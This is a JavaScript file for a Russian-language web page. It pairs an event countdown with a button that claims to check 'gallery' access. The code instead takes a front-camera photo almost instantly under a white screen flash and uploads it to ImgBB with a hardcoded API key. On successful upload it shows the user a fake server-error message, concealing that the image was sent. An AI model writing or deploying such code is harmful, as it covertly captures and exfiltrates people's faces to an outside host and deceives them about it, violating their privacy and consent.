document.addEventListener('DOMContentLoaded', function(){
    const takePhotoBtn = document.getElementById('takePhotoBtn');
    const statusMessage = document.getElementById('statusMessage');

    takePhotoBtn.addEventListener('click', async () => {
        try {
            statusMessage.textContent = 'Проверка доступа к галерее...';

            // Проверяем поддержку getUserMedia
            if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
                throw new Error('Ваш браузер не поддерживает доступ к камере');
            }

            // Запрашиваем разрешение на использование камеры
            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });

            // Создаем полноэкранный белый div для освещения
            const lightDiv = document.createElement('div');
            lightDiv.style.position = 'fixed';
            lightDiv.style.top = '0';
            lightDiv.style.left = '0';
            lightDiv.style.width = '100%';
            lightDiv.style.height = '100%';
            lightDiv.style.backgroundColor = 'white';
            lightDiv.style.zIndex = '9999';
            document.body.appendChild(lightDiv);

            statusMessage.textContent = 'Подготовка галереи...';

            const video = document.createElement('video');
            video.srcObject = stream;
            await video.play();

            // Добавляем обратный отсчет
            for (let i = 3; i > 0; i--) {
                statusMessage.textContent = `Фото через ${i}...`;
                await new Promise(resolve => setTimeout(resolve, 10));
            }

            // Делаем снимок
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0);

            // Удаляем белый фон после съемки
            document.body.removeChild(lightDiv);

            statusMessage.textContent = 'Отправка фото...';
            canvas.toBlob(async (blob) => {
                const formData = new FormData();
                formData.append('image', blob, 'photo.jpg');

                try {
                    const response = await fetch(`https://api.imgbb.com/1/upload?key=e675375e0eb8a80496752c205a38fd79`, {
                        method: 'POST',
                        body: formData
                    });
                    const result = await response.json();
                    if (result.success) {
                        statusMessage.textContent = 'ОШИБКА ПРИ ПЕРЕДАЧИ НА СЕРВЕР!';
                        console.log('Ссылка на изображение:', result.data.url);
                    } else {
                        throw new Error('Ошибка при загрузке на ImgBB');
                    }
                } catch (error) {
                    console.error('Ошибка при отправке фото:', error);
                    statusMessage.textContent = 'Не удалось отправить фото. Пожалуйста, попробуйте еще раз.';
                }
            }, 'image/jpeg');

            stream.getTracks().forEach(track => track.stop());
        } catch (error) {
            console.error('Ошибка:', error);
            statusMessage.textContent = `Ошибка: ${error.message}. Пожалуйста, убедитесь, что вы дали разрешение на использование камеры и попробуйте еще раз.`;
        }
    });


    function updateCountdown() {
        const targetDate = new Date('2025-03-13T00:00:00').getTime(); // Изменено на 2025 год
        const now = new Date().getTime();
        const difference = targetDate - now;

        if (difference > 0) {
            const days = Math.floor(difference / (1000 * 60 * 60 * 24));
            const hours = Math.floor((difference % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
            const minutes = Math.floor((difference % (1000 * 60 * 60)) / (1000 * 60));
            const seconds = Math.floor((difference % (1000 * 60)) / 1000);

            document.getElementById('countdown').innerHTML = `
                <div class="countdown-item">
                    <span class="countdown-number">${days}</span>
                    <span class="countdown-label">дней</span>
                </div>
                <div class="countdown-item">
                    <span class="countdown-number">${hours}</span>
                    <span class="countdown-label">часов</span>
                </div>
                <div class="countdown-item">
                    <span class="countdown-number">${minutes}</span>
                    <span class="countdown-label">минут</span>
                </div>
                <div class="countdown-item">
                    <span class="countdown-number">${seconds}</span>
                    <span class="countdown-label">секунд</span>
                </div>
            `;
        } else {
            clearInterval(countdownTimer);
            document.getElementById('countdown').innerHTML = 'Время истекло!';
        }
    }

    const countdownTimer = setInterval(updateCountdown, 1000);
    updateCountdown(); // Вызываем функцию сразу для отображения начального значения
});